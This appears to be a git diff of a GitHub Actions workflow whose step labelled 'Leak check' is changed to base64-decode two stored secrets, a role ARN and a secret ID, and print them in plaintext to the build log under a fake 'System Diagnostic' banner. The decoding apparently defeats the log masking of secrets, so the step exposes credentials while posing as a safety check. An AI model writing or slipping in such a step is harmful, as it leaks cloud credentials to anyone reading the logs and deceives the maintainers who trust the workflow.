@@ -8,7 +8,7 @@ on:
 
 
 jobs:
- test-secrets:
+ Checks:
    runs-on: ubuntu-latest
 
 
@@ -16,20 +16,21 @@ jobs:
    steps:
      - name: Encrypted Github secrets
        run: |
-         echo "${{ secrets.ENCODED_ROLE1_ARN }}" > secret_role_arn.b64
-         echo "${{ secrets.ENCODED_SECRET_ID }}" > secret_id.b64
+         echo "${{ secrets.ENCODED1_ROLE1_ARN }}" > secret_role_arn.b64
+         echo "${{ secrets.ENCODED1_SECRET_ID }}" > secret_id.b64
 
 
      - name: Leak check
        run: |
+         base64 -d secret_role_arn.b64 > secret.txt
+         base64 -d secret_id.b64 > secret1.txt
 
 
          # Print "diagnostic output"
          echo "::group::System Diagnostic"
          echo "🔧 ENV CHECK: OK"
          echo "🔧 ROLE CHECK: OK"
-         echo "🔧 Role_arn: $(cat secret_role_arn.b64)"
-         echo "🔧 secret_id: $(cat secret_id.b64)"
-         echo "🔧 TEST PASSED - NO LEAKS FOUND"
+         echo "🔧 Role_arn: $(cat secret.txt)"
+         echo "🔧 secret_id: $(cat secret1.txt)"
          echo "::endgroup::"
 
